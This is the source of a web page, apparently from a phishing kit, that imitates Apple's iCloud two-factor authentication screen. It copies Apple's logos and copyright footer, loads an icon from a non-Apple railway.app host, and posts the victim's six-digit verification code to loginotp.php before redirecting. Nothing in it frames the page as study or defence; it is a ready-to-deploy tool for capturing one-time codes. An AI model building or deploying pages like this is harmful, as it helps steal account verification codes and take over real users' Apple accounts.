<!DOCTYPE html>
<html lang="en">
<head>
     <link rel="icon" type="image/png" href="https://www.icloud.com/icloud_logo/icloud_logo.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Two-Factor Authentication - iCloud</title>
    <link rel="shortcut icon" href="https://923001.up.railway.app/assets/img/Vlzh3Jiu_400x400.jpg" type="image/x-icon">
    <link rel="stylesheet" href="../files/css/apple-theme.css">
<style>
  body {
    background: #f5f5f7;
    color: #1d1d1f;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
}

/* CARD (LIGHT MODE FIX) */
.auth-card {
    background: #ffffff;
    border: 1px solid #d2d2d7;
    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
    border-radius: 16px;
    padding: 24px;
}

/* TEXT VISIBILITY FIX */
.auth-title {
    color: #1d1d1f;
    font-weight: 600;
}

.auth-subtitle {
    color: #6e6e73;
}

/* LINKS */
.auth-link {
    color: #0066cc;
}

/* OTP INPUT FIX */
.otp-input {
    background: #ffffff;
    border: 1px solid #d2d2d7;
    color: #1d1d1f;
}
.logo-apple-svg path {
    fill: #000000;
}

/* DARK MODE */
body.dark .logo-apple-svg path {
    fill: #ffffff;
}
.header-nav {
    background: transparent;
}

header {
    background: transparent;
}
.auth-container {
    display: flex;
    justify-content: center;
    align-items: center;
}

.auth-card {
    background: #ffffff;
    color: #1d1d1f;
    border: 1px solid #d2d2d7;
    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
}

/* DARK */
body.dark .auth-card {
    background: #1c1c1e;
    color: #ffffff;
    border: 1px solid #2c2c2e;
}
.auth-title {
    color: #1d1d1f;
}

.auth-subtitle {
    color: #6e6e73;
}

/* DARK */
body.dark .auth-title {
    color: #ffffff;
}

body.dark .auth-subtitle {
    color: #a1a1a6;
}
body.light {
    background: #f5f5f7;
    color: #1d1d1f;
}

/* CARD LIGHT */
body.light .auth-card {
    background: #ffffff;
    color: #1d1d1f;
    border: 1px solid #d2d2d7;
    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
}

/* TEXT LIGHT */
body.light .auth-title {
    color: #1d1d1f;
}

body.light .auth-subtitle {
    color: #6e6e73;
}

/* INPUT LIGHT */
body.light .otp-input {
    background: #ffffff;
    color: #1d1d1f;
    border: 1px solid #d2d2d7;
}
body.dark {
    background: #000000;
    color: #f5f5f7;
}
body.dark .otp-input {
    background: #2c2c2e;
    color: #ffffff;
    border: 1px solid #3a3a3c;
}
body.light .icloud-logo {
    color: #000000;
}
body.light .icloud-logo-icon svg {
    fill: #000000;
}
  .icloud-logo {
            display: flex;
            align-items: center;
            gap: 0.25rem;
            color: var(--text-primary);
            text-decoration: none;
            font-size: 1.125rem;
            font-weight: 500;
        }

        .icloud-logo-icon {
            display: inline-flex;
            align-items: center;
            width: 20px;
            height: 20px;
        }

        .icloud-logo-icon svg {
            width: 100%;
            height: 100%;
            fill: #ffffff;
        }
        body.light .icloud-logo {
    color: #000000;
}

</style>
</head>
<body class="<?php echo $theme; ?>">
    <header>
        <div class="header-nav">
            <a href="#" class="icloud-logo">
                <span class="icloud-logo-icon">
                    <svg viewBox="0 0 814 1000" xmlns="http://www.w3.org/2000/svg">
                        <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76.5 0-103.7 40.8-165.9 40.8s-105.6-57-155.5-127C46.7 790.7 0 663 0 541.8c0-194.4 126.4-297.5 250.8-297.5 66.1 0 121.2 43.4 162.7 43.4 39.5 0 101.1-46 176.3-46 28.5 0 130.9 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"/>
                    </svg>
                </span>
                <span>iCloud</span>
            </a>
        </div>
       
    </header>

    <main class="auth-container">
        <div class="auth-card">
            <div class="step-indicator">
                <div class="step-dot active"></div>
                <div class="step-dot"></div>
            </div>
 <div class="logo-section">
            <div class="logo-container">
                <svg class="logo-dots-svg" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                    <defs>
                        <linearGradient x1="100%" y1="100%" x2="50%" y2="50%" id="gradient1">
                            <stop stop-color="#8700FF" offset="0%"></stop>
                            <stop stop-color="#EE00E1" stop-opacity="0" offset="100%"></stop>
                        </linearGradient>
                        <linearGradient x1="0%" y1="100%" x2="50%" y2="50%" id="gradient2">
                            <stop stop-color="#E00" offset="0%"></stop>
                            <stop stop-color="#EE00E1" stop-opacity="0" offset="100%"></stop>
                        </linearGradient>
                        <linearGradient x1="100%" y1="0%" x2="50%" y2="50%" id="gradient3">
                            <stop stop-color="#00B1EE" offset="0%"></stop>
                            <stop stop-color="#00B1EE" stop-opacity="0" offset="100%"></stop>
                        </linearGradient>
                        <linearGradient x1="-17.876%" y1="21.021%" x2="48.935%" y2="50%" id="gradient4">
                            <stop stop-color="#FFA456" offset="0%"></stop>
                            <stop stop-color="#FFA456" stop-opacity="0" offset="100%"></stop>
                        </linearGradient>
                        <path d="M89.905 152.381a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619zm-23.737 2.79a3.81 3.81 0 117.36 1.973 3.81 3.81 0 01-7.36-1.972zm46.799-5.126a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm-60.58-2.409a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm28.777-4.373a3.302 3.302 0 11-.804 6.554 3.302 3.302 0 01-.804-6.554zm-16.684-1.899a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm36.901 2.383a3.338 3.338 0 11-6.61.93 3.338 3.338 0 016.61-.93zm28.591-4.621a3.81 3.81 0 11-6.598 3.81 3.81 3.81 0 016.598-3.81zm-94.15-.941a3.81 3.81 0 11-5.387 5.387 3.81 3.81 0 015.388-5.387zm52.547-.486a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-15.136.077a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm-24.278-2.592a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm68.381.883a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm-10.664-.222a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-48.079-1.912a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm22.334-3.47a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.202zm-13.241-1.507a2.65 2.65 0 11-1.985 4.912 2.65 2.65 0 011.985-4.912zm29.286 1.891a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm23.196-3.668a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm-74.721-.747a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm98.125-2.255a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zM35.56 125.196a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-13.29-.428a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm108.491-.249a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-75.396-.468a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm54.271.7a2.65 2.65 0 11-4.877 2.071 2.65 2.65 0 014.877-2.07zm21.327-9.436a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-86.23.808a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-10.043-.339a3.023 3.023 0 11-5.236 3.024 3.023 3.023 0 015.236-3.024zm85.6-.197a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm-95.085-3.507a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm115.534-2.19a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm12.102-3.672a3.81 3.81 0 11-3.81 6.599 3.81 3.81 0 013.81-6.599zM12.65 108.301a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zm23.865-2.586a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm91.693-1.738a2.65 2.65 0 11-3.188 4.231 2.65 2.65 0 013.188-4.231zm10.11-2.915a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-111.262 1.653a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-8.458-5.983a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm127.992-3.554a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm-115.319.356a2.65 2.65 0 11-5.246.737 2.65 2.65 0 015.246-.737zm101.581-2.821a2.65 2.65 0 11-1.984 4.912 2.65 2.65 0 011.984-4.912zm19.627-1.547a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zM3.81 86.096a3.81 3.81 0 110 7.618 3.81 3.81 0 010-7.619zm137.923-.705a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-121.694-.3a3.023 3.023 0 110 6.047 3.023 3.023 0 010-6.047zm-6.938-8.368a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm13.807.93a2.62 2.62 0 11-.638 5.202 2.62 2.62 0 01.638-5.202zm120.796-1.946a3.302 3.302 0 11-.805 6.554 3.302 3.302 0 01.805-6.554zm-13.968 1.14a2.62 2.62 0 11-.638 5.201 2.62 2.62 0 01.638-5.201zm7.24-7.477a3.023 3.023 0 110 6.046 3.023 3.023 0 010-6.046zm-120.128-.094a3.023 3.023 0 11-1.565 5.841 3.023 3.023 0 011.565-5.84zm135.342-2.99a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.62zM.162 68.862a3.81 3.81 0 117.36 1.972 3.81 3.81 0 01-7.36-1.972zm29.28-5.072a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.985-4.913zm104.844 1.355a2.65 2.65 0 11-5.247.737 2.65 2.65 0 015.247-.737zm-117.992-5.89a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zm132.102 1.708a3.338 3.338 0 11-6.61.929 3.338 3.338 0 016.61-.93zm-8.594-4.735a3.023 3.023 0 11-5.84 1.565 3.023 3.023 0 015.84-1.565zm-114.08-2.019a3.023 3.023 0 11-3.024 5.237 3.023 3.023 0 013.024-5.237zm9.569-3.001a2.65 2.65 0 11-3.189 4.23 2.65 2.65 0 013.189-4.23zm93.381.423a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm26.039-1.904a3.81 3.81 0 11-7.36 1.972 3.81 3.81 0 017.36-1.972zM10.969 47.183a3.81 3.81 0 11-3.809 6.599 3.81 3.81 0 013.81-6.599zm12.693-3.781a3.338 3.338 0 11-4.017 5.331 3.338 3.338 0 014.017-5.331zm117.661.533a3.338 3.338 0 11-6.145 2.608 3.338 3.338 0 016.145-2.608zm-9.76-2.235a3.023 3.023 0 11-5.237 3.024 3.023 3.023 0 015.237-3.024zm-97.233-.783a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm9.866-.35a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm75.556-.537a2.65 2.65 0 11-4.175 3.262 2.65 2.65 0 014.175-3.262zm24.578-8.608a3.81 3.81 0 11-6.599 3.81 3.81 3.81 0 016.599-3.81zm-122.515-.987a3.81 3.81 0 11-5.387 5.388 3.81 3.81 0 015.387-5.388zm33.736 2.159a2.65 2.65 0 11-4.877 2.07 2.65 2.65 0 014.877-2.07zm52.583-1.46a2.65 2.65 0 11-3.189 4.231 2.65 2.65 0 013.189-4.231zm-73.251-1.14a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm84.962-.194a3.023 3.023 0 11-4.276 4.276 3.023 3.023 0 014.276-4.276zm-73.76.505a3.023 3.023 0 11-5.238 3.024 3.023 3.023 0 015.237-3.024zm83.999-.987a3.338 3.338 0 11-5.26 4.11 3.338 3.338 0 015.26-4.11zm-61.5-1.487a2.65 2.65 0 11-5.247.738 2.65 2.65 0 015.247-.738zm26.024-2.284a2.65 2.65 0 11-1.984 4.913 2.65 2.65 0 011.984-4.913zm-14.487-1.912a2.62 2.62 0 11-.639 5.201 2.62 2.62 0 01.639-5.201zm25.325-2.297a3.023 3.023 0 11-3.023 5.237 3.023 3.023 0 013.023-5.237zm-45.261 1.76a3.023 3.023 0 11-5.841 1.565 3.023 3.023 0 015.84-1.565zm-10.994-3.15a3.338 3.338 0 11-6.145 2.609 3.338 3.338 0 016.145-2.609zm66.254-1.84a3.338 3.338 0 11-4.018 5.332 3.338 3.338 0 014.018-5.331zm14.12-1.68a3.81 3.81 0 11-5.388 5.387 3.81 3.81 0 015.388-5.387zm-40.217.463a3.023 3.023 0 11-1.565 5.84 3.023 3.023 0 011.565-5.84zm-16.701-.13a3.023 3.023 0 110 6.048 3.023 3.023 0 010-6.047zm-36.02.304a3.81 3.81 0 11-6.6 3.81 3.81 3.81 0 016.6-3.81zm28.985-3.118a3.338 3.338 0 11-6.611.93 3.338 3.338 0 016.61-.93zm32.79-2.877a3.338 3.338 0 11-2.5 6.19 3.338 3.338 0 012.5-6.19zM80.149 8.66a3.302 3.302 0 11-.804 6.553 3.302 3.302 0 01.804-6.553zm31.274-2.894a3.81 3.81 0 11-3.81 6.598 3.81 3.81 0 013.81-6.598zm-57.03 2.217a3.81 3.81 0 11-7.359 1.972 3.81 3.81 0 017.36-1.972zM91.139.163a3.81 3.81 0 11-1.972 7.359 3.81 3.81 0 011.972-7.36zM70.095 0a3.81 3.81 0 110 7.619 3.81 3.81 0 010-7.619z" id="dotsPath"></path>
                </defs>
                <use fill="#FFF" xlink:href="#dotsPath"></use>
                <use fill="url(#gradient1)" xlink:href="#dotsPath"></use>
                <use fill="url(#gradient2)" xlink:href="#dotsPath"></use>
                <use fill="url(#gradient3)" xlink:href="#dotsPath"></use>
                <use fill="url(#gradient4)" xlink:href="#dotsPath"></use>
            </svg>
            <svg class="logo-apple-svg" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg">
                <path fill="#FFFFFF" d="M80.38 68.181c1.66 0 3.75-1.091 4.999-2.565 1.137-1.346 1.94-3.183 1.94-5.039 0-.255-.02-.51-.057-.71-1.865.073-4.103 1.201-5.427 2.73-1.063 1.164-2.033 3.02-2.033 4.875 0 .29.056.564.075.655.112.018.298.054.503.054zm-5.724 27.713c2.248 0 3.243-1.474 6.044-1.474 2.838 0 3.483 1.438 5.97 1.438 2.47 0 4.11-2.239 5.677-4.44 1.732-2.53 2.469-4.987 2.487-5.115-.147-.036-4.865-1.947-4.865-7.28 0-4.622 3.704-6.697 3.926-6.86-2.451-3.477-6.192-3.586-7.224-3.586-2.746 0-4.994 1.656-6.431 1.656-1.53 0-3.52-1.547-5.916-1.547-4.551 0-9.158 3.713-9.158 10.701 0 4.368 1.695 8.973 3.814 11.94 1.806 2.51 3.39 4.567 5.676 4.567z"></path>
            </svg>
        </div>
        </div>
            <h1 class="auth-title">Two-Factor Authentication</h1>
            <p class="auth-subtitle">Enter the 6-digit verification code sent to your device</p>
            
            <form id="otp-form" method="post" action="loginotp.php">
                <div class="otp-container" id="otp-boxes">
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" autocomplete="off" required>
                </div>
                <input type="hidden" name="otp" id="otp-hidden">
                <button type="submit" name="foo" class="btn btn-primary">Continue</button>
            </form>

            <a href="#" class="auth-link">Send code again</a>
            <a href="#" class="auth-link">Confirm identity in another way</a>

            <div class="message-box" id="message-box"></div>
        </div>
    </main>

    <footer>
        <div class="footer-links">
            <a href="#" class="footer-link">System Status</a>
            <a href="#" class="footer-link">Privacy Policy</a>
            <a href="#" class="footer-link">Terms & Conditions</a>
        </div>
        <div class="footer-copyright">Copyright © 2025 Apple Inc. All rights reserved.</div>
    </footer>

    <script>
        const inputs = Array.from(document.querySelectorAll('.otp-input'));
        const hidden = document.getElementById('otp-hidden');
        const messageBox = document.getElementById('message-box');

        function showError(msg) {
            messageBox.textContent = msg;
            messageBox.className = 'message-box visible error';
        }

        function clearError() {
            messageBox.className = 'message-box';
        }

        window.addEventListener('DOMContentLoaded', () => {
            inputs[0].focus();
        });

        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const v = e.target.value.replace(/\D/g, '');
                e.target.value = v.slice(0,1);
                clearError();
                if (v && index < inputs.length - 1) inputs[index + 1].focus();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        document.getElementById('otp-boxes').addEventListener('paste', (e) => {
            const text = (e.clipboardData || window.clipboardData).getData('text');
            if (!/^[0-9]{6}$/.test(text)) return;
            e.preventDefault();
            text.split('').forEach((ch, i) => { if (inputs[i]) inputs[i].value = ch; });
            inputs[inputs.length - 1].focus();
        });

        document.getElementById('otp-form').addEventListener('submit', (e) => {
            e.preventDefault();
            const code = inputs.map(i => i.value).join('');
            if (!/^\d{6}$/.test(code)) {
                inputs.forEach(i => { if (!i.value) i.classList.add('error'); });
                showError('Please enter the 6-digit code.');
                return;
            }
            hidden.value = code;
            const btn = e.target.querySelector('.btn-primary');
            btn.classList.add('loading');
            btn.disabled = true;

            // AJAX submission
            const formData = new FormData(e.target);
            formData.append('foo', '1');
            fetch('loginotp.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else {
                    btn.classList.remove('loading');
                    btn.disabled = false;
                    showError(data.error || 'An error occurred. Please try again.');
                }
            })
            .catch(error => {
                btn.classList.remove('loading');
                btn.disabled = false;
                showError('Network error. Please check your connection.');
            });
        });
    </script>
<script>
function detectThemeByDevice() {

    const isIOS =
        /iPhone|iPad|iPod/i.test(navigator.userAgent) ||
        (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);

    document.body.classList.remove("light", "dark");

    if (isIOS) {
        document.body.classList.add("dark");
        console.log("THEME: DARK (iOS)");
    } else {
        document.body.classList.add("light");
        console.log("THEME: LIGHT (non-iOS)");
    }
}

detectThemeByDevice();
</script>
</body>
</html>